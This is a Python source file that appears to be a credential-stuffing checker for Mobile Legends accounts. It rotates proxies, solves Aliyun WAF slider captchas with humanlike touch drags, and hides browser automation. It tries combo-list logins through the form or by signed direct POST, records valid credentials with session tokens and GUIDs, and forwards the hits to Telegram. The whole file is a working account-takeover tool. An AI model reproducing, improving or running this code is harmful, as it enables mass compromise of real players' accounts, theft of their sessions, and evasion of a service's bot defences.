def parse_proxy(raw: str):
    """Mengembalikan dict proxy untuk Playwright/CloakBrowser.
    Mendukung jenis: HTTP, HTTPS, SOCKS5, SOCKS5H, SOCKS4, SOCKS4A.
    Mendukung format:
      - scheme://[user:pass@]host:port
      - host:port
      - host:port:user:pass (format DataImpulse / Webshare / generic dump)
      - user:pass:host:port
      - user:pass@host:port
      - host:port:user
    Pembersihan otomatis: tab, koma, spasi, kutip, tanda pagar.
    """
    try:
        raw = (raw or '').strip().strip('"').strip("'")
        if not raw or raw.startswith('#'):
            return None
        
        # Bersihkan pemisah tak lazim
        raw = raw.replace('\t', ':').replace(',', ':').replace(' ', '')

        scheme = 'http'
        if '://' in raw:
            parts = raw.split('://', 1)
            s_lower = parts[0].lower()
            if s_lower in ('socks5', 'socks5h'):
                scheme = 'socks5'
            elif s_lower in ('socks4', 'socks4a'):
                scheme = 'socks4'
            elif s_lower in ('http', 'https'):
                scheme = s_lower
            else:
                return None
            raw = parts[1]

        user, pwd = None, None
        if '@' in raw:
            creds, hostpart = raw.rsplit('@', 1)
            u_p = creds.split(':', 1)
            user = urllib.parse.unquote(u_p[0])
            if len(u_p) > 1:
                pwd = urllib.parse.unquote(u_p[1])
            raw = hostpart

        parts = raw.split(':')
        host, port = None, None

        if len(parts) == 1:
            return None
        elif len(parts) == 2:
            host = parts[0]
            port = int(parts[1])
        elif len(parts) == 3:
            host = parts[0]
            port = int(parts[1])
            user = parts[2]
        elif len(parts) >= 4:
            if parts[1].isdigit():
                host = parts[0]
                port = int(parts[1])
                user = parts[2]
                pwd = ':'.join(parts[3:])
            elif parts[3].isdigit():
                user = parts[0]
                pwd = parts[1]
                host = parts[2]
                port = int(parts[3])
            else:
                return None

        if not host or not port or not (1 <= port <= 65535):
            return None

        proxy = {"server": f"{scheme}://{host}:{port}"}
        if user is not None:
            proxy["username"] = user
        if pwd is not None:
            proxy["password"] = pwd
        return proxy
    except Exception:
        return None

def safe_proxy_str(proxy: dict) -> str:
    if not proxy:
        return "<none>"
    srv = proxy.get("server", "")
    usr = proxy.get("username", "")
    if usr:
        if "://" in srv:
            sch, rst = srv.split("://", 1)
            return f"{sch}://{usr}:***@{rst}"
        return f"{usr}:***@{srv}"
    return srv

def load_proxies(path: str) -> list[str]:
    if not os.path.exists(path):
        return []
    out = []
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        for ln in f:
            ln = ln.strip()
            if ln and not ln.startswith('#'):
                out.append(ln)
    return out

async def test_proxy(proxy: dict, browser=None) -> tuple[bool, str]:
    """FIX: Ganti browser-based test → raw urllib HTTP request.
    Hemat bandwidth: tidak buka browser context, tidak load halaman, tidak ada CDN.
    browser parameter dipertahankan untuk kompatibilitas signature lama (diabaikan).
    """
    try:
        server = proxy.get('server', '')
        username = proxy.get('username', '')
        password = proxy.get('password', '')

        # Bangun proxy URL dengan kredensial jika ada
        if username:
            # Encode kredensial yang mengandung karakter khusus
            enc_user = urllib.parse.quote(username, safe='')
            enc_pass = urllib.parse.quote(password, safe='') if password else ''
            if '://' in server:
                scheme, rest = server.split('://', 1)
                proxy_url = f"{scheme}://{enc_user}:{enc_pass}@{rest}"
            else:
                proxy_url = f"http://{enc_user}:{enc_pass}@{server}"
        else:
            proxy_url = server if '://' in server else f"http://{server}"

        loop = asyncio.get_running_loop()

        def _do_check():
            if proxy_url.lower().startswith('socks'):
                # ponytail: stdlib urllib rejects socks4/5; use curl_cffi (or TCP connect fallback)
                try:
                    from curl_cffi import requests as _creq
                    r = _creq.get(
                        'http://cp.cloudflare.com/generate_204',
                        proxies={'http': proxy_url, 'https': proxy_url},
                        timeout=PROXY_TEST_TIMEOUT,
                    )
                    return r.status_code
                except ImportError:
                    import socket
                    hp = proxy_url.split('://', 1)[1].rsplit('@', 1)[-1].split(':')
                    with socket.create_connection((hp[0], int(hp[1])), timeout=PROXY_TEST_TIMEOUT):
                        return 200
            handler = urllib.request.ProxyHandler({
                'http':  proxy_url,
                'https': proxy_url,
            })
            opener = urllib.request.build_opener(handler)
            opener.addheaders = [('User-Agent', 'Mozilla/5.0')]
            # Target ringan: hanya butuh koneksi berhasil, tidak perlu body besar
            resp = opener.open('http://cp.cloudflare.com/generate_204', timeout=PROXY_TEST_TIMEOUT)
            return resp.status if hasattr(resp, 'status') else 200

        status = await asyncio.wait_for(
            loop.run_in_executor(None, _do_check),
            timeout=PROXY_TEST_TIMEOUT + 2
        )
        return True, "OK"

    except asyncio.TimeoutError:
        return False, "Timeout"
    except Exception as e:
        msg = str(e)
        if any(k in msg for k in ('407', 'TRAFFIC_EXHAUSTED', 'Unauthorized')):
            return False, "407 TRAFFIC_EXHAUSTED (Kuota DataImpulse habis)"
        elif any(k in msg for k in ('tunnel', 'TUNNEL', 'Connection refused')):
            return False, "Tunnel connection failed"
        elif 'timed out' in msg.lower():
            return False, "Timeout"
        return False, msg[:45]

async def test_proxies(raw_proxies, browser=None, concurrency=20):
    """ponytail: deduplicate by (server, base_token) so 110 DataImpulse country lines test in ~1s."""
    parsed = [(r, parse_proxy(r)) for r in raw_proxies]
    gateways = {}
    for raw, p in parsed:
        if not p:
            continue
        base_tok = (p.get("username") or "").split("__")[0]
        gw_key = (p.get("server", ""), base_tok)
        gateways.setdefault(gw_key, []).append(p)

    sem = asyncio.Semaphore(concurrency)
    gw_results = {}

    async def probe_gw(gw_key, samples):
        async with sem:
            # Prefer reliable Tier-1/SEA samples first; try up to 3 samples before marking gateway dead
            ordered = sorted(samples, key=lambda sp: 0 if any(f"__cr.{r}" in (sp.get("username") or "") for r in ("sg", "id", "us", "jp", "my")) else 1)
            res = (False, "Probe failed")
            for sp in ordered[:3]:
                res = await test_proxy(sp)
                if res[0]:
                    break
            gw_results[gw_key] = res

    await asyncio.gather(*(probe_gw(k, sps) for k, sps in gateways.items()), return_exceptions=True)

    good = []
    for idx, (raw, p) in enumerate(parsed, 1):
        if not p:
            p_out(f" {c(RED)}[BAD ]{W} [{idx:>3}/{len(parsed)}] {raw} → invalid format")
            continue
        base_tok = (p.get("username") or "").split("__")[0]
        ok, reason = gw_results.get((p.get("server", ""), base_tok), (False, "Probe failed"))
        if ok:
            good.append((raw, p))
        else:
            p_out(f" {c(RED)}[FAIL]{W} [{idx:>3}/{len(parsed)}] {safe_proxy_str(p)} → {c(GOLD)}{reason}{W}")
    if good:
        p_out(f" {c(GREEN)}[ OK ]{W} Verified {len(good)}/{len(parsed)} proxies via {len(gateways)} gateway probe(s)")
    return good

# ── Aliyun Captcha Slider Solver (CDP Touch - proxy.py 1:1) ─────────────────
async def _touch(cdp, etype, x, y, keep=False):
    pts = [] if keep else [{"x": float(x), "y": float(y), "radiusX": 6, "radiusY": 6, "force": 1, "id": 1}]
    try:
        await cdp.send("Input.dispatchTouchEvent", {"type": etype, "touchPoints": pts})
    except Exception:
        pass

async def _human_drag(page, ctx, sx, sy, dist):
    try:
        # ponytail: reuse single CDP session per page so 1000+ slider solves don't leak zombie CDP sessions
        cdp = getattr(page, '_touch_cdp', None)
        if cdp is None:
            cdp = await ctx.new_cdp_session(page)
            page._touch_cdp = cdp
        R = lambda a, b: a + random.random() * (b - a)
        pts = []
        x = 0.0
        ae = dist * R(0.28, 0.40)
        for i in range(2 + int(random.random() * 2)):
            x += R(3, 7) * (1 + i * 0.6)
            if x > ae:
                x = ae
                break
            pts.append({"x": x, "d": R(12, 25)})
        nf = 4 + int(random.random() * 4)
        rem = dist - x
        for i in range(nf):
            step = rem / (nf - i) * R(0.8, 1.2)
            if step < 4 or x + step >= dist - 1:
                break
            x += step
            pts.append({"x": x, "d": R(4, 9)})
        pts.append({"x": dist + R(1.5, 4), "d": R(12, 22)})
        pts.append({"x": dist + R(-1, 1), "d": R(10, 18)})
        pts.append({"x": dist, "d": R(5, 10)})

        await _touch(cdp, "touchStart", sx, sy)
        await asyncio.sleep(R(15, 30) / 1000)
        for p in pts:
            prog = min(p["x"] / dist, 1.0) if dist > 0 else 0
            wb = 2.6 * math.sin(math.pi * prog)
            dy = wb * 0.3 if p["x"] >= dist else wb * R(0.55, 1.0)
            await _touch(cdp, "touchMove", sx + p["x"], sy + dy + R(-0.4, 0.4))
            await asyncio.sleep(p["d"] / 1000)
        await _touch(cdp, "touchEnd", sx + dist, sy, keep=True)
        return True
    except Exception as e:
        page._touch_cdp = None
        dbg(f"drag err: {e}")
        return False

async def solve_waf(page, ctx) -> bool:
    has = False
    try:
        has = await page.evaluate("""() => {
            return !!(document.getElementById('aliyunCaptcha-sliding-slider')
                   || document.querySelector('.btn_slide')
                   || document.querySelector('[id*="sliding-slider"]')
                   || document.getElementById('waf_nc_block')
                   || document.querySelector('.nc_scale'));
        }""")
    except Exception:
        pass
    if not has:
        return True

    box = None
    for _ in range(25):  # ponytail: up to 5.0s for Aliyun nc.js to mount; rotate fast if stuck
        box = await page.evaluate("""() => {
            const s = document.getElementById('aliyunCaptcha-sliding-slider')
                   || document.querySelector('.btn_slide')
                   || document.querySelector('[id*="sliding-slider"]')
                   || document.querySelector('[class*="btn_slide"]');
            if (!s) return null;
            const r = s.getBoundingClientRect();
            if (r.width === 0 || r.height === 0) return null;
            const track = document.getElementById('aliyunCaptcha-sliding-body')
                       || document.querySelector('.nc_scale')
                       || document.querySelector('[id*="sliding-body"]')
                       || s.closest('#WAF_NC_WRAPPER')
                       || s.parentElement;
            const tr = track ? track.getBoundingClientRect() : r;
            const inner = (track && track.clientWidth) ? track.clientWidth : tr.width;
            const sw = s.offsetWidth || r.width;
            return { x: r.x, y: r.y, w: r.width, h: r.height, mt: Math.max(60, Math.ceil(inner - sw)) };
        }""")
        if box:
            break
        await asyncio.sleep(0.2)
    if not box:
        return False

    sx = box["x"] + box["w"] / 2
    sy = box["y"] + box["h"] / 2
    # Fallback 185px (lebih akurat untuk MLBB slider) bukan 280px yang terlalu jauh
    base_dist = box.get("mt", 185)

    # Coba hingga 3x dengan variasi jarak ±5% untuk kompensasi measurement error
    dist_variants = [base_dist, int(base_dist * 0.95), int(base_dist * 1.05)]
    for variant_dist in dist_variants:
        await _human_drag(page, ctx, sx, sy, variant_dist)
        still = True
        for _ in range(15):
            await asyncio.sleep(0.1)
            still = await page.evaluate("""() => {
                const v = el => !!(el && el.getBoundingClientRect().width > 0 && getComputedStyle(el).display !== 'none' && getComputedStyle(el).visibility !== 'hidden');
                const blk = document.getElementById('waf_nc_block');
                const s = document.getElementById('aliyunCaptcha-sliding-slider') || document.querySelector('.btn_slide') || document.querySelector('[id*="sliding-slider"]');
                return v(blk) || v(s);
            }""")
            if not still:
                break
        if not still:
            stats['waf_solved'] += 1
            clear_line()
            if not _TUI_ACTIVE: p_out(f"  {c(GREEN)}→ slider solved ✓{W}")
            print_progress()
            return True

    clear_line()
    if not _TUI_ACTIVE: p_out(f"  {c(GOLD)}→ slider failed (still visible){W}")
    print_progress()
    return False

# ── Smart Browser Launcher (CloakBrowser Pro with Playwright Chrome fallback) ─
async def launch_browser_smart(headless=True, humanize=True):
    global _driver_pid, _pw_instance
    c_args = [
        '--disable-blink-features=AutomationControlled',
        '--no-first-run',
        '--no-default-browser-check',
        '--disable-dev-shm-usage',
        '--no-sandbox',
        '--mute-audio',
    ]
    try:
        lic_key = _ACTIVE_LICENSE_KEY or activate_cloak_license()
        # ponytail: keep CloakBrowser Pro native stealth & humanize intact (no --disable-gpu / custom args override)
        b = await asyncio.wait_for(
            launch_async(headless=headless, humanize=True, license_key=lic_key or None),
            timeout=20.0,
        )
        if not _TUI_ACTIVE: p_out(f"{c(GREEN)}[*] CloakBrowser Pro siap ✓{W}")
        try:
            _driver_pid = b._impl_obj._connection._transport._proc.pid
        except Exception:
            pass
        return b
    except Exception as e:
        if 'session limit' in str(e).lower():
            if not _TUI_ACTIVE:
                p_out(f"\n  {c(RED)}[!] CloakBrowser Pro: session limit reached!{W}")
                p_out(f"  {c(GOLD)}    Tunggu ~4 menit agar seat lama bebas, atau tutup sesi lain.{W}")
                p_out(f"  {c(GRAY)}    Fallback Chrome biasa sering diblokir 405 oleh Aliyun WAF.{W}\n")
        else:
            dbg(f"CloakBrowser launch note: {e} → beralih ke Chrome Playwright")
        from playwright.async_api import async_playwright
        pw = await async_playwright().start()
        _pw_instance = pw
        if headless:
            c_args.append('--headless=new')
        try:
            b = await pw.chromium.launch(channel='chrome', headless=headless, args=c_args)
        except Exception:
            b = await pw.chromium.launch(headless=headless, args=c_args)
        if not _TUI_ACTIVE: p_out(f"{c(GOLD)}[*] Chrome Playwright fallback aktif (non-stealth){W}")
        try:
            _driver_pid = b._impl_obj._connection._transport._proc.pid
        except Exception:
            pass
        return b

# ── Fast Direct HTTP POST in Verified Browser Session ───────────────────────
def build_login_payload(user: str, passw: str) -> dict:
    md5pwd = hashlib.md5(passw.encode('utf-8')).hexdigest()
    sign_str = f"account={user}&country=&md5pwd={md5pwd}&op=new_login_pwd"
    sign = hashlib.md5(sign_str.encode('utf-8')).hexdigest()
    return {
        "op": "new_login_pwd",
        "sign": sign,
        "params": {"account": user, "md5pwd": md5pwd, "country": ""},
        "lang": "en",
    }

async def do_fast_http_post(page, user: str, passw: str, wid: int = 0) -> tuple[str, dict]:
    """Tembak HTTP POST langsung dari dalam session browser yang sudah lolos slider."""
    payload = build_login_payload(user, passw)
    try:
        resp = await page.evaluate(
            """async (bodyObj) => {
                try {
                    const r = await fetch('https://accountmtapi.mobilelegends.com/', {
                        method: 'POST',
                        headers: {
                            'Accept': 'application/json, text/plain, */*',
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(bodyObj),
                        credentials: 'include'
                    });
                    const text = await r.text();
                    return { status: r.status, text: text };
                } catch (e) {
                    return { status: 0, text: String(e) };
                }
            }""",
            payload,
        )
        status = resp.get("status", 0)
        body = (resp.get("text") or "").strip().lstrip("\ufeff").strip()
        if status == 405 or "aliyun" in body.lower() or "waf" in body.lower():
            return "WAF", {"__waf": True, "message": f"HTTP_{status}"}
        if not body.startswith("{"):
            return "ERR", {"message": f"HTTP_{status}: {body[:60]}"}
        res_json = json.loads(body)
        if isinstance(res_json.get("data"), str) and len(res_json["data"]) > 20:
            decrypted = decrypt_payload(res_json["data"])
            if decrypted:
                try:
                    res_json["decrypted_data"] = json.loads(decrypted)
                except Exception:
                    pass
        elif isinstance(res_json.get("data"), dict):
            res_json["decrypted_data"] = res_json["data"]
        return classify(res_json), res_json
    except Exception as e:
        return "ERR", {"message": str(e)}

# ── Core Browser Login via Manual Form Typing ────────────────────────────────
async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0) -> tuple[str, dict]:
    """Submit form dan tangkap respons login menggunakan Direct Vue Bridge + Fallback Natural Typing."""
    api_result = {"json": None, "raw": None, "had_waf": False}
    resp_event = asyncio.Event()
    captured_responses = []

    async def on_resp(resp):
        if 'mpass' in resp.url or 'accountmtapi' in resp.url:
            try:
                if resp.request.method != 'POST':
                    return
                post_raw = resp.request.post_data or ''
                if post_raw:
                    try:
                        pd = json.loads(post_raw)
                        sent_op = pd.get('op', '')
                        if sent_op and sent_op != 'new_login_pwd':
                            return
                        p_obj = pd.get('params') if isinstance(pd.get('params'), dict) else {}
                        sent_acct = p_obj.get('account') or pd.get('account') or pd.get('email') or ''
                        if sent_acct and str(sent_acct).strip().lower() != user.strip().lower():
                            return
                    except Exception:
                        pass
                body = await resp.text()
                # Strip BOM (U+FEFF) dan whitespace sebelum deteksi JSON
                # tanpa ini response dengan BOM/leading-space terlewat sepenuhnya
                body_stripped = body.strip().lstrip('\ufeff').strip()
                body_low = body_stripped.lower()
                if 'aliyun' in body_low or 'waf' in body_low or resp.status == 405:
                    api_result["had_waf"] = True
                    resp_event.set()
                if body_stripped.startswith('{'):
                    j = json.loads(body_stripped)
                    captured_responses.append((resp.status, j))
                    if j.get('code') is not None:
                        api_result["json"] = j
                        resp_event.set()
            except Exception:
                pass

    page.on("response", on_resp)
    try:
        # 1. Langsung tembak Vue XHR tanpa wait_for_selector IPC roundtrip (fallback wait jika DOM hilang)
        dbg(f"w{wid:02d} check {user}")
        _vue_js = """([u, p]) => {
            let el = document.querySelector('.content-but');
            let formComp = null;
            while (el) {
                if (el.__vue__ && el.__vue__.submit) { formComp = el.__vue__; break; }
                el = el.parentElement;
            }
            if (!formComp) return false;
            // ponytail: cegah Vue pindah ke halaman OTP saat kena 2FA (1086)
            formComp.jump = function() {};
            if (formComp.$router) formComp.$router.push = function() {};
            formComp.submitState = false;
            formComp.submitforbiden = false;
            formComp.emailerror = false;
            formComp.passworderror = false;
            formComp.email = u;
            formComp.password = p;
            if (formComp.setemailvalue) formComp.setemailvalue(u);
            if (formComp.setpasswordvalue) formComp.setpasswordvalue(p);
            const inpE = document.querySelector('input[type="text"]');
            const inpP = document.querySelector('input[type="password"]');
            if (inpE && inpE.value !== u) { inpE.value = u; inpE.dispatchEvent(new Event('input', {bubbles:true})); }
            if (inpP && inpP.value !== p) { inpP.value = p; inpP.dispatchEvent(new Event('input', {bubbles:true})); }
            formComp.submit();
            if (formComp.emailerror || formComp.passworderror) return 'CLIENT_INVALID';
            return 'OK';
        }"""
        vue_res = await page.evaluate(_vue_js, [user, passw])
        if vue_res == 'CLIENT_INVALID':
            return 'INVALID', {'message': 'Client_InvalidLengthOrFormat'}
        vue_submitted = (vue_res == 'OK')
        if not vue_submitted:
            try:
                await page.wait_for_selector('input[type="password"]', timeout=3500)
            except Exception:
                if not await solve_waf(page, ctx):
                    await page.goto(LOGIN_PAGE, wait_until="domcontentloaded", timeout=12000)
                await page.wait_for_selector('input[type="password"]', timeout=5000)
            vue_res = await page.evaluate(_vue_js, [user, passw])
            if vue_res == 'CLIENT_INVALID':
                return 'INVALID', {'message': 'Client_InvalidLengthOrFormat'}
            vue_submitted = (vue_res == 'OK')

        if not vue_submitted:
            inputs = await page.query_selector_all('input')
            if len(inputs) < 2:
                return 'ERR', {'message': 'input_elements_not_found'}
            # Field username: click → settle → clear → type
            await inputs[0].click()
            await asyncio.sleep(0.08)   # tunggu focus benar-benar pindah
            await page.evaluate("el => el.value = ''", inputs[0])
            for ch in user:
                await page.keyboard.type(ch)
                await asyncio.sleep(0.01)
            await page.evaluate('''() => {
                const el = document.querySelector('input[type="text"]');
                if (el) {
                    el.dispatchEvent(new Event('input', {bubbles:true}));
                    el.dispatchEvent(new Event('blur', {bubbles:true}));
                }
            }''')
            await asyncio.sleep(0.05)
            # Field password: click → settle → clear → type
            # inputs[1] bisa stale setelah DOM update — re-query
            pwd_input = await page.query_selector('input[type="password"]')
            if not pwd_input:
                pwd_input = inputs[1]
            await pwd_input.click()
            await asyncio.sleep(0.08)   # tunggu focus benar-benar pindah ke password
            await page.evaluate("el => el.value = ''", pwd_input)
            for ch in passw:
                await page.keyboard.type(ch)
                await asyncio.sleep(0.01)
            await page.evaluate('''() => {
                const el = document.querySelector('input[type="password"]');
                if (el) {
                    el.dispatchEvent(new Event('input', {bubbles:true}));
                    el.dispatchEvent(new Event('blur', {bubbles:true}));
                }
            }''')
            await asyncio.sleep(0.05)
            btn = await page.query_selector('.content-but')
            if btn: await btn.click()
            else: await page.keyboard.press('Enter')

        # 3. Event-driven wait up to 12s (wakes immediately on fast JSON or 405 WAF)
        try:
            await asyncio.wait_for(resp_event.wait(), timeout=12.0)
        except asyncio.TimeoutError:
            pass

        drag_count = 0
        if not api_result["json"]:
            for _ in range(2):
                if api_result["had_waf"]:
                    try:
                        await page.wait_for_selector(
                            '#aliyunCaptcha-sliding-slider, .btn_slide, #waf_nc_block',
                            state='visible', timeout=2500
                        )
                    except Exception:
                        pass
                has_slider = await page.evaluate("""() => {
                    const v = el => !!(el && el.getBoundingClientRect().width > 0 && getComputedStyle(el).display !== 'none' && getComputedStyle(el).visibility !== 'hidden');
                    const s = document.getElementById('aliyunCaptcha-sliding-slider') || document.querySelector('.btn_slide') || document.querySelector('[id*="sliding-slider"]');
                    const b = document.getElementById('waf_nc_block') || document.getElementById('WAF_NC_WRAPPER');
                    return v(s) || v(b);
                }""")
                if not has_slider:
                    break
                drag_count += 1
                dbg(f"w{wid:02d} Aliyun slider ({user}), solving...")
                if not await solve_waf(page, ctx):
                    break
                if api_result["json"]:
                    break
                resp_event.clear()
                api_result["had_waf"] = False
                try:
                    await asyncio.wait_for(resp_event.wait(), timeout=0.15)
                except asyncio.TimeoutError:
                    pass
                if not api_result["json"] and not api_result["had_waf"]:
                    if vue_submitted:
                        await page.evaluate(_vue_js, [user, passw])
                    try:
                        await asyncio.wait_for(resp_event.wait(), timeout=10.0)
                    except asyncio.TimeoutError:
                        pass
                if api_result["json"]:
                    break

        res_json = api_result["json"]
        if not res_json:
            if api_result["had_waf"] or drag_count > 0:
                return 'WAF', {'message': 'waf_challenge_unsolved'}
            return 'ERR', {'message': 'timeout_waiting_response'}

        # 4. Dekripsi data jika terenkripsi (VALID / OTP)
        if isinstance(res_json.get('data'), str) and len(res_json['data']) > 20:
            decrypted = decrypt_payload(res_json['data'])
            if decrypted:
                try:
                    res_json['decrypted_data'] = json.loads(decrypted)
                except Exception:
                    pass
        elif isinstance(res_json.get('data'), dict):
            res_json['decrypted_data'] = res_json['data']

        kind = classify(res_json)
        return kind, res_json

    except Exception as e:
        dbg(f"w{wid} login error: {e}")
        return 'ERR', {'message': str(e)}
    finally:
        try:
            page.remove_listener("response", on_resp)
        except Exception:
            pass

_STATIC_CACHE = {}  # url -> (status, headers, body_bytes)

async def _route_filter(route):
    """Abort heavy assets and serve static JS/CSS bundles from RAM cache (0 proxy quota on repeat contexts)."""
    r = route.request
    url = r.url
    if r.resource_type in ("image", "media", "font") or any(d in url for d in ("google-analytics", "facebook", "doubleclick")):
        return await route.abort()
    path = url.split("?", 1)[0].lower()
    if r.method == "GET" and path.endswith((".js", ".css")):
        if not any(k in url.lower() for k in ("cf.aliyun", "ynuf.aliapp", "acjs.aliyun", "waf_nc", "accountmtapi", "mpass", "moba5v5")):
            if url in _STATIC_CACHE:
                st, hdrs, body = _STATIC_CACHE[url]
                return await route.fulfill(status=st, headers=hdrs, body=body)
            try:
                resp = await route.fetch()
                body = await resp.body()
                if resp.status == 200 and body and len(_STATIC_CACHE) < 128:
                    _STATIC_CACHE[url] = (resp.status, dict(resp.headers), body)
                return await route.fulfill(status=resp.status, headers=dict(resp.headers), body=body)
            except Exception:
                pass
    return await route.continue_()

# ── Worker Task Loop with Proxy & WAF Isolation ─────────────────────────────
async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                     browser, dm, base_proxy_info=None, proxy_pool=None,
                     ensure_browser=None):
    """
    Desain baru: 1 slider → 1 sesi browser → tembak HTTP POST terus-menerus.

    Alur per-worker:
      1. Buka context + navigasi ke LOGIN_PAGE.
      2. Selesaikan slider Aliyun SATU kali (slide → cookie WAF tersimpan di sesi).
      3. Untuk setiap akun: langsung do_fast_http_post() — tanpa sentuh DOM lagi.
      4. Jika dapat OTP (2FA) → reload LOGIN_PAGE sekali agar form kembali bersih,
         lalu lanjut HTTP POST untuk akun berikutnya (tidak perlu slide ulang).
      5. Jika dapat RATE (rate-limit) → rotate proxy (ganti context),
         slide ulang satu kali di context baru, lalu lanjut.
      6. Jika dapat WAF (405 / aliyun body) di HTTP POST → slide ulang di context
         yang sama dulu (sesi mungkin expire). Jika gagal → rotate proxy.
      7. Tidak ada periodic page-reload, tidak ada reset-form DOM.
    """
    ctx              = None
    page             = None
    page2            = None
    pool             = proxy_pool or ([base_proxy_info] if base_proxy_info else [])
    pool_idx         = wid % max(len(pool), 1)
    cur_proxy_info   = pool[pool_idx] if pool else None
    rot_user_info    = None
    worker_epoch     = 0
    slider_cleared   = False
    _acct_retries    = {}

    async def _close_ctx():
        nonlocal ctx, page, page2, slider_cleared
        if ctx:
            try:
                await ctx.close()
            except Exception:
                pass
            ctx = page = page2 = None
            slider_cleared = False

    async def _attach_page(p):
        try:
            cdp_net = await ctx.new_cdp_session(p)
            await cdp_net.send("Network.enable")
            _live_reqs = set()
            def _on_resp_rx(params):
                # Only count real remote network traffic (ignore RAM route.fulfill hits where remoteIPAddress is empty)
                if params.get('response', {}).get('remoteIPAddress'):
                    _live_reqs.add(params.get('requestId'))
            def _on_load_done(params):
                rid = params.get('requestId')
                if rid in _live_reqs:
                    _live_reqs.discard(rid)
                    stats['bytes_used'] += params.get('encodedDataLength', 0) + 450
            cdp_net.on("Network.responseReceived", _on_resp_rx)
            cdp_net.on("Network.loadingFinished", _on_load_done)
        except Exception:
            pass
        await p.route(re.compile(r"\.(png|jpe?g|gif|webp|svg|woff2?|ttf|eot|ico|mp4|mp3|js|css)(\?|$)", re.I), _route_filter)
        p.set_default_timeout(15000)
        await p.goto(LOGIN_PAGE, wait_until="domcontentloaded", timeout=8000)

    async def open_context_and_page(max_attempts: int = 8, rotate_ip: bool = False) -> bool:
        """Buka context baru pada sticky proxy + navigasi ke login page."""
        nonlocal worker_epoch, ctx, page, page2, rot_user_info, cur_proxy_info, pool_idx, slider_cleared
        if rotate_ip:
            worker_epoch += 1
        await _close_ctx()

        for attempt in range(1, max_attempts + 1):
            if pool:
                pool_idx = (pool_idx + 1) % len(pool)
                cur_proxy_info = pool[pool_idx]
            try:
                b = await ensure_browser() if ensure_browser else browser
                try:
                    if hasattr(b, 'is_connected') and not b.is_connected() and ensure_browser:
                        b = await ensure_browser(force_relaunch=True)
                except Exception:
                    if ensure_browser:
                        b = await ensure_browser(force_relaunch=True)

                ctx_opts = {'has_touch': True}
                if cur_proxy_info and cur_proxy_info.get('username'):
                    rot_user_info = await rotated_user_async(
                        cur_proxy_info['username'],
                        cur_proxy_info.get('server', ''),
                        session_id=f"w{wid}e{worker_epoch}"
                    )
                    proxy_conf = {
                        'server':   cur_proxy_info['server'],
                        'username': rot_user_info['user'],
                        'password': cur_proxy_info.get('password', ''),
                    }
                    if not _TUI_ACTIVE: p_out(f"  [{now()[11:]}] w{wid} context proxy: {safe_proxy_str(proxy_conf)}...")
                    ctx_opts['proxy'] = proxy_conf
                elif cur_proxy_info:
                    ctx_opts['proxy'] = cur_proxy_info

                ctx = await b.new_context(**ctx_opts)
                stats['proxy_ctx'] += 1
                page = await ctx.new_page()
                await _attach_page(page)
                return True
            except Exception as e:
                err_s = str(e)
                if ensure_browser and any(k in err_s.lower() for k in ('target', 'closed', 'connection', 'browser has been closed')):
                    try:
                        await ensure_browser(force_relaunch=True)
                    except Exception:
                        pass
                if 'ERR_TUNNEL_CONNECTION_FAILED' in err_s and rot_user_info:
                    bad_reg = rot_user_info.get('region', '').lower()
                    if bad_reg:
                        async with _get_rotation_lock():
                            _TUNNEL_BLACKLIST.add(bad_reg)
                        dbg(f"w{wid} region [{bad_reg.upper()}] di-blacklist")
                dbg(f"w{wid} open_ctx attempt {attempt}/{max_attempts}: {err_s[:70]}")
                await _close_ctx()
                if attempt == max_attempts:
                    if not _TUI_ACTIVE: p_out(f"{c(RED)}[!] w{wid} exhausted {max_attempts} proxy attempts{W}")
                    return False
                await asyncio.sleep(random.uniform(0.3, 0.8))
        return False

    async def ensure_slider_cleared() -> bool:
        """Pastikan slider Aliyun diselesaikan sekali per context, lalu buka Tab 2 pipelining."""
        nonlocal slider_cleared, page2
        if slider_cleared:
            return True
        try:
            await page.wait_for_selector('input[type="password"], #aliyunCaptcha-sliding-slider, .btn_slide, #waf_nc_block', timeout=4500)
        except Exception:
            pass
        try:
            await page.wait_for_selector('input[type="password"]', timeout=400)
        except Exception:
            if not await solve_waf(page, ctx):
                return False
            try:
                await page.wait_for_selector('input[type="password"]', timeout=3500)
            except Exception:
                return False

        has_slider = await page.evaluate("""() => {
            const v = el => !!(el && el.getBoundingClientRect().width > 0 && getComputedStyle(el).display !== 'none' && getComputedStyle(el).visibility !== 'hidden');
            const s = document.getElementById('aliyunCaptcha-sliding-slider') || document.querySelector('.btn_slide') || document.querySelector('[id*="sliding-slider"]');
            const b = document.getElementById('waf_nc_block') || document.getElementById('WAF_NC_WRAPPER');
            return v(s) || v(b);
        }""")
        if has_slider and not await solve_waf(page, ctx):
            return False

        slider_cleared = True
        # ponytail: buka Tab 2 berbagi cookie WAF + sticky IP yang sama (2x speed, 0 quota JS/CSS)
        if page2 is None and ctx is not None:
            try:
                page2 = await ctx.new_page()
                await _attach_page(page2)
            except Exception:
                page2 = None
        return True

    async def handle_result(kind: str, res_data: dict, user: str, passw: str, dec_d: dict):
        iso_time = now()
        if kind == 'VALID':
            guid = dec_d.get('guid', '')
            sess = dec_d.get('session', '')
            name = dec_d.get('name', '')
            append_line(FILES['VALID'], f"{user}:{passw}|{sess}|{guid}|{name}|{iso_time}")
            stats['valid'] += 1
            info_res = None
            guid_int = int(guid) if str(guid).isdigit() else 0
            if INFO_OK and guid_int and sess and dm:
                try:
                    loop = asyncio.get_running_loop()
                    info_res = await asyncio.wait_for(
                        loop.run_in_executor(None, get_player_info, guid_int, sess, dm),
                        timeout=8.0,
                    )
                except Exception as ie:
                    dbg(f"w{wid} lookup err ({guid_int}): {ie}")
            print_hit(user, passw, dec_d, info_res)
            await send_tg(
                f"✅ <b>VALID</b>\n"
                f"<code>{esc_html(user)}:{esc_html(passw)}</code>\n"
                f"Session: <code>{esc_html(sess)}</code>\n"
                f"GUID: {esc_html(guid)} · {esc_html(name)}"
            )
        elif kind == 'OTP':
            _raw_data = res_data.get('data')
            masked_email = (
                dec_d.get('email') or res_data.get('email')
                or (_raw_data if isinstance(_raw_data, str) and '@' in _raw_data else None)
                or (_raw_data.get('email') if isinstance(_raw_data, dict) else None)
                or '?'
            )
            append_line(FILES['OTP'], f"{user}:{passw}|{masked_email}|{iso_time}")
            stats['otp'] += 1
            print_result('OTP', user, passw, f"Email: {masked_email}")
